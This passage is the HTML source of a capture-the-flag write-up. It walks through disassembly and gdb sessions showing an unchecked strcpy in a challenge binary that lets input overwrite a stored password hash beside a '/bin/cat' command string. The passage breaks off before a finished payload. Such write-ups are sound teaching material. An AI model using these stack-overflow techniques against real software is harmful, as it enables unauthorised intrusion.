@@ -1,0 +1,781 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>CAMP CTF - Secret_File - staring into /dev/null</title>
+  <meta name="author" content="barrebas">
+
+  
+  <meta name="description" content="In this case, we&rsquo;re asked to retrieve a secret file and given.. another binary. What did you expect? ;-) 1
+2
+3
+bas@tritonal:~/bin/ccc/ &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-secret-file">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="staring into /dev/null" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">staring into /dev/null</a></h1>
+  
+    <h2>barrebas</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:barrebas.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">CAMP CTF - Secret_File</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-08-18T21:35:08+02:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:35 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>In this case, we&rsquo;re asked to retrieve a secret file and given.. another binary. What did you expect? ;-)</p>
+
+<!--more-->
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/bin/ccc/secret_file<span class="nv">$ </span>./secret_file
+</span><span class='line'>AAAA
+</span><span class='line'>wrong password!
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Hmm. Let&rsquo;s see what makes this thing tick:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/bin/ccc/secret_file<span class="nv">$ </span>strings ./secret_file
+</span><span class='line'>/lib64/ld-linux-x86-64.so.2
+</span><span class='line'>x<span class="o">]</span>Cm
+</span><span class='line'>libcrypto.so.1.0.0
+</span><span class='line'>_ITM_deregisterTMCloneTable
+</span><span class='line'>__gmon_start__
+</span><span class='line'>_Jv_RegisterClasses
+</span><span class='line'>_ITM_registerTMCloneTable
+</span><span class='line'>SHA256_Final
+</span><span class='line'>SHA256_Init
+</span><span class='line'>_init
+</span><span class='line'>SHA256_Update
+</span><span class='line'>_fini
+</span><span class='line'>libc.so.6
+</span><span class='line'>strcpy
+</span><span class='line'>strrchr
+</span><span class='line'>puts
+</span><span class='line'>__stack_chk_fail
+</span><span class='line'>stdin
+</span><span class='line'>popen
+</span><span class='line'>fgets
+</span><span class='line'>fclose
+</span><span class='line'>getline
+</span><span class='line'>__cxa_finalize
+</span><span class='line'>strcmp
+</span><span class='line'>__libc_start_main
+</span><span class='line'>snprintf
+</span><span class='line'>_edata
+</span><span class='line'>__bss_start
+</span><span class='line'>_end
+</span><span class='line'>GLIBC_2.4
+</span><span class='line'>GLIBC_2.2.5
+</span><span class='line'>AUATUSH
+</span><span class='line'><span class="o">[]</span>A<span class="se">\A</span><span class="o">]</span>
+</span><span class='line'>D<span class="nv">$x1</span>
+</span><span class='line'>D<span class="nv">$xdH3</span>
+</span><span class='line'><span class="o">[]</span>A<span class="se">\A</span><span class="o">]</span>
+</span><span class='line'>D<span class="nv">$h1</span>
+</span><span class='line'>/bin/catH
+</span><span class='line'> ./secreH
+</span><span class='line'>t_data.aH
+</span><span class='line'>9387a00eH
+</span><span class='line'>D<span class="nv">$ </span>H
+</span><span class='line'>31e413c5H
+</span><span class='line'>D<span class="k">$(</span>H
+</span><span class='line'>5af9c08cH
+</span><span class='line'>D<span class="nv">$0H</span>
+</span><span class='line'>69cd119aH
+</span><span class='line'>D<span class="nv">$8H</span>
+</span><span class='line'>b4685ef3H
+</span><span class='line'>D<span class="nv">$@</span>H
+</span><span class='line'>bc8bcbe1H
+</span><span class='line'>D<span class="nv">$HH</span>
+</span><span class='line'>cf821611H
+</span><span class='line'>D<span class="nv">$PH</span>
+</span><span class='line'>19457127H
+</span><span class='line'>D<span class="nv">$X1</span>
+</span><span class='line'>D<span class="nv">$hdH3</span>
+</span><span class='line'>AWAVA
+</span><span class='line'>AUATL
+</span><span class='line'><span class="o">[]</span>A<span class="se">\A</span><span class="o">]</span>A^A_
+</span><span class='line'>%02x
+</span><span class='line'>wrong password!
+</span><span class='line'><span class="p">;</span>*3<span class="nv">$&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We see strings like <code>bc8bcbe1H</code>, which look like part of a hash being pushed onto the stack. Combining the hash part gives a SHA256 hash which has no known plaintext. Hmmm! Since this is an exploit-focused binary, let&rsquo;s exploit it!</p>
+
+<p>It gets interesting around this code:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'> e8e:    rep stos QWORD PTR es:<span class="o">[</span>rdi<span class="o">]</span>,rax
+</span><span class='line'> e91: lea    rdi,<span class="o">[</span>rbx+0x100<span class="o">]</span>
+</span><span class='line'> e98: mov    rcx,rsp
+</span><span class='line'> e9b: movabs rax,0x7461632f6e69622f
+</span><span class='line'> ea5: mov    QWORD PTR <span class="o">[</span>rsp<span class="o">]</span>,rax
+</span><span class='line'> ea9: movabs rax,0x65726365732f2e20
+</span><span class='line'> eb3: mov    QWORD PTR <span class="o">[</span>rsp+0x8<span class="o">]</span>,rax
+</span><span class='line'> eb8: movabs rax,0x612e617461645f74
+</span><span class='line'> ec2: mov    QWORD PTR <span class="o">[</span>rsp+0x10<span class="o">]</span>,rax
+</span><span class='line'> ec7: mov    eax,0x6373
+</span><span class='line'> ecc: mov    WORD PTR <span class="o">[</span>rsp+0x18<span class="o">]</span>,ax
+</span><span class='line'> ed1: xor    eax,eax
+</span><span class='line'> ed3: call   a30 &lt;snprintf@plt&gt;
+</span><span class='line'> ed8: lea    rcx,<span class="o">[</span>rsp+0x20<span class="o">]</span>
+</span><span class='line'> edd: mov    esi,0x41
+</span><span class='line'> ee2: movabs rax,0x6530306137383339
+</span><span class='line'> eec: mov    QWORD PTR <span class="o">[</span>rsp+0x20<span class="o">]</span>,rax
+</span><span class='line'> ef1: lea    rdi,<span class="o">[</span>rbx+0x11b<span class="o">]</span>
+</span><span class='line'> ef8: movabs rax,0x3563333134653133
+</span><span class='line'> f02: mov    QWORD PTR <span class="o">[</span>rsp+0x28<span class="o">]</span>,rax
+</span><span class='line'> f07: lea    rdx,<span class="o">[</span>rip+0x106<span class="o">]</span>        <span class="c"># 1014 &lt;_fini+0x10&gt;</span>
+</span><span class='line'> f0e: movabs rax,0x6338306339666135
+</span><span class='line'> f18: mov    QWORD PTR <span class="o">[</span>rsp+0x30<span class="o">]</span>,rax
+</span><span class='line'> f1d: movabs rax,0x6139313164633936
+</span><span class='line'> f27: mov    QWORD PTR <span class="o">[</span>rsp+0x38<span class="o">]</span>,rax
+</span><span class='line'> f2c: movabs rax,0x3366653538363462
+</span><span class='line'> f36: mov    QWORD PTR <span class="o">[</span>rsp+0x40<span class="o">]</span>,rax
+</span><span class='line'> f3b: movabs rax,0x3165626362386362
+</span><span class='line'> f45: mov    QWORD PTR <span class="o">[</span>rsp+0x48<span class="o">]</span>,rax
+</span><span class='line'> f4a: movabs rax,0x3131363132386663
+</span><span class='line'> f54: mov    QWORD PTR <span class="o">[</span>rsp+0x50<span class="o">]</span>,rax
+</span><span class='line'> f59: movabs rax,0x3732313735343931
+</span><span class='line'> f63: mov    QWORD PTR <span class="o">[</span>rsp+0x58<span class="o">]</span>,rax
+</span><span class='line'> f68: xor    eax,eax
+</span><span class='line'> f6a: mov    BYTE PTR <span class="o">[</span>rsp+0x60<span class="o">]</span>,0x0
+</span><span class='line'> f6f: call   a30 &lt;snprintf@plt&gt;
+</span><span class='line'> f74: mov    rax,QWORD PTR <span class="o">[</span>rsp+0x68<span class="o">]</span>
+</span><span class='line'> f79: xor    rax,QWORD PTR fs:0x28
+</span><span class='line'> f82: jne    f8a &lt;__cxa_finalize@plt+0x4aa&gt;
+</span><span class='line'> f84: add    rsp,0x70
+</span><span class='line'> f88: pop    rbx
+</span><span class='line'> f89: ret
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It passes a few strings to the stack. We&rsquo;ll be seeing them later. Let&rsquo;s run the binary in <code>gdb</code>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>checksec
+</span><span class='line'>CANARY    : ENABLED
+</span><span class='line'>FORTIFY   : disabled
+</span><span class='line'>NX        : ENABLED
+</span><span class='line'>PIE       : ENABLED
+</span><span class='line'>RELRO     : FULL
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>PIE is enabled, so find out the base address of the binary with <code>vmmap</code>. Our input gets processed here:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'> b40:    call   ad0 &lt;getline@plt&gt;
+</span><span class='line'> b45: cmp    rax,0xffffffffffffffff
+</span><span class='line'> b49: je     c4c &lt;__cxa_finalize@plt+0x16c&gt;
+</span><span class='line'> b4f: mov    rdi,QWORD PTR <span class="o">[</span>rsp+0x8<span class="o">]</span>
+</span><span class='line'> b54: mov    esi,0xa
+</span><span class='line'> b59: call   a40 &lt;strrchr@plt&gt;
+</span><span class='line'> b5e: <span class="nb">test   </span>rax,rax
+</span><span class='line'> b61: je     c4c &lt;__cxa_finalize@plt+0x16c&gt;
+</span><span class='line'> b67: mov    BYTE PTR <span class="o">[</span>rax<span class="o">]</span>,0x0
+</span><span class='line'> b6a: mov    rsi,QWORD PTR <span class="o">[</span>rsp+0x8<span class="o">]</span>
+</span><span class='line'> b6f: mov    rdi,r13
+</span><span class='line'> b72: lea    rbp,<span class="o">[</span>r13+0x15c<span class="o">]</span>
+</span><span class='line'> b79: lea    rbx,<span class="o">[</span>r13+0x17c<span class="o">]</span>
+</span><span class='line'> b80: lea    r12,<span class="o">[</span>r13+0x1bc<span class="o">]</span>
+</span><span class='line'> b87: call   9e0 &lt;strcpy@plt&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We have an unchecked <code>strcpy</code>. Lovely. Let&rsquo;s see what it will copy where:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>vmmap
+</span><span class='line'>Start              End                Perm    Name
+</span><span class='line'>0x0000555555554000 0x0000555555556000 r-xp    /home/bas/bin/ccc/secret_file/secret_file
+</span><span class='line'>0x0000555555755000 0x0000555555756000 r--p    /home/bas/bin/ccc/secret_file/secret_file
+</span><span class='line'>0x0000555555756000 0x0000555555757000 rw-p    /home/bas/bin/ccc/secret_file/secret_file
+</span><span class='line'>...
+</span><span class='line'>gdb-peda<span class="nv">$ </span>b *0x0000555555554000+0xb87
+</span><span class='line'>Breakpoint <span class="m">4</span> at 0x555555554b87
+</span><span class='line'>gdb-peda<span class="nv">$ </span>c
+</span><span class='line'>
+</span><span class='line'>...
+</span><span class='line'>
+</span><span class='line'><span class="o">=</span>&gt; 0x555555554b87:  call   0x5555555549e0 &lt;strcpy@plt&gt;
+</span><span class='line'>   0x555555554b8c:    mov    edx,0x100
+</span><span class='line'>   0x555555554b91:    mov    rsi,rbp
+</span><span class='line'>   0x555555554b94:    mov    rdi,r13
+</span><span class='line'>   0x555555554b97:    call   0x555555554dd0
+</span><span class='line'>Guessed arguments:
+</span><span class='line'>arg<span class="o">[</span>0<span class="o">]</span>: 0x7fffffffe190 --&gt; 0x0
+</span><span class='line'>arg<span class="o">[</span>1<span class="o">]</span>: 0x555555757010 --&gt; 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p>So it will copy our input to the stack. Let&rsquo;s examine the stack:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>x/200wx 0x7fffffffe190
+</span><span class='line'>0x7fffffffe190:   0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x7fffffffe1a0:   0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x7fffffffe1b0:   0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x7fffffffe1c0:   0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x7fffffffe1d0:   0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x7fffffffe1e0:   0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x7fffffffe1f0:   0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x7fffffffe200:   0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x7fffffffe210:   0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x7fffffffe220:   0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x7fffffffe230:   0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x7fffffffe240:   0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x7fffffffe250:   0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x7fffffffe260:   0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x7fffffffe270:   0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x7fffffffe280:   0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x7fffffffe290:   0x6e69622f  0x7461632f  0x732f2e20  0x65726365
+</span><span class='line'>0x7fffffffe2a0:   0x61645f74  0x612e6174  0x39006373  0x61373833
+</span><span class='line'>0x7fffffffe2b0:   0x33653030  0x31346531  0x35356333  0x63396661
+</span><span class='line'>0x7fffffffe2c0:   0x36633830  0x31646339  0x62613931  0x35383634
+</span><span class='line'>0x7fffffffe2d0:   0x62336665  0x63623863  0x63316562  0x31323866
+</span><span class='line'>0x7fffffffe2e0:   0x31313136  0x37353439  0x00373231  0x00007fff
+</span><span class='line'>0x7fffffffe2f0:   0x00000000  0x00000000  0xf7ffa828  0x00007fff
+</span><span class='line'>0x7fffffffe300:   0xffffe390  0x00007fff  0xffffe3a8  0x00007fff
+</span><span class='line'>0x7fffffffe310:   0x00000000  0x00000001  0xf7ffe758  0x00007fff
+</span><span class='line'>0x7fffffffe320:   0x13742321  0x00000000  0xf7a071ef  0x00007fff
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nice, what are those bytes at <code>0x7fffffffe290</code>?</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>x/2s 0x7fffffffe290
+</span><span class='line'>0x7fffffffe290:    <span class="s2">&quot;/bin/cat ./secret_data.asc&quot;</span>
+</span><span class='line'>0x7fffffffe2ab:    <span class="s2">&quot;9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Hey, that second one looks like the SHA256 hash! We&rsquo;ll be able to overwrite this&hellip; Seeing as it&rsquo;s stored as a string, better set a breakpoint on <code>strcmp()</code> for later&hellip;</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'> bd5:    call   a80 &lt;strcmp@plt&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Restarted the binary:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>b *0x0000555555554000+0xbd5
+</span><span class='line'>Breakpoint <span class="m">2</span> at 0x555555554bd5
+</span><span class='line'>gdb-peda<span class="nv">$ </span>c
+</span><span class='line'>AAAA
+</span><span class='line'>
+</span><span class='line'>...
+</span><span class='line'>
+</span><span class='line'><span class="o">=</span>&gt; 0x555555554bd5:  call   0x555555554a80 &lt;strcmp@plt&gt;
+</span><span class='line'>   0x555555554bda:    mov    r12d,eax
+</span><span class='line'>   0x555555554bdd:    <span class="nb">test   </span>eax,eax
+</span><span class='line'>   0x555555554bdf:    jne    0x555555554c40
+</span><span class='line'>   0x555555554be1:    lea    rdi,<span class="o">[</span>r13+0x100<span class="o">]</span>
+</span><span class='line'>Guessed arguments:
+</span><span class='line'>arg<span class="o">[</span>0<span class="o">]</span>: 0x7fffffffe2ab <span class="o">(</span><span class="s2">&quot;9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127&quot;</span><span class="o">)</span>
+</span><span class='line'>arg<span class="o">[</span>1<span class="o">]</span>: 0x7fffffffe30c <span class="o">(</span><span class="s2">&quot;003daa08bd98e706782e059cbadf83277b5296645a98dfb636131e32cd7f131d&quot;</span><span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>OK, so it will compare the SHA256 hash of our input with the one stored on the stack. The nice thing, however, is that it will only hash the first 0x100 bytes! This means we can predict the hash we get:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>r
+</span><span class='line'>warning: the debug information found in <span class="s2">&quot;/lib64/ld-2.13.so&quot;</span> does not match <span class="s2">&quot;/lib64/ld-linux-x86-64.so.2&quot;</span> <span class="o">(</span>CRC mismatch<span class="o">)</span>.
+</span><span class='line'>
+</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span><span class='line'>
+</span><span class='line'>...
+</span><span class='line'>
+</span><span class='line'>   0x555555554bc5:    jne    0x555555554ba0
+</span><span class='line'>   0x555555554bc7:    lea    rsi,<span class="o">[</span>r13+0x17c<span class="o">]</span>
+</span><span class='line'>   0x555555554bce:    lea    rdi,<span class="o">[</span>r13+0x11b<span class="o">]</span>
+</span><span class='line'><span class="o">=</span>&gt; 0x555555554bd5:  call   0x555555554a80 &lt;strcmp@plt&gt;
+</span><span class='line'>
+</span><span class='line'>...
+</span><span class='line'>
+</span><span class='line'>Guessed arguments:
+</span><span class='line'>arg<span class="o">[</span>0<span class="o">]</span>: 0x7fffffffe2ab <span class="o">(</span><span class="s2">&quot;9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127&quot;</span><span class="o">)</span>
+</span><span class='line'>arg<span class="o">[</span>1<span class="o">]</span>: 0x7fffffffe30c <span class="o">(</span><span class="s2">&quot;e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb&quot;</span><span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>...
+</span><span class='line'>
+</span><span class='line'>Breakpoint 2, 0x0000555555554bd5 in ?? <span class="o">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And if we do it again, but send 512 * &lsquo;A&rsquo;:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>r
+</span><span class='line'>warning: the debug information found in <span class="s2">&quot;/lib64/ld-2.13.so&quot;</span> does not match <span class="s2">&quot;/lib64/ld-linux-x86-64.so.2&quot;</span> <span class="o">(</span>CRC mismatch<span class="o">)</span>.
+</span><span class='line'>
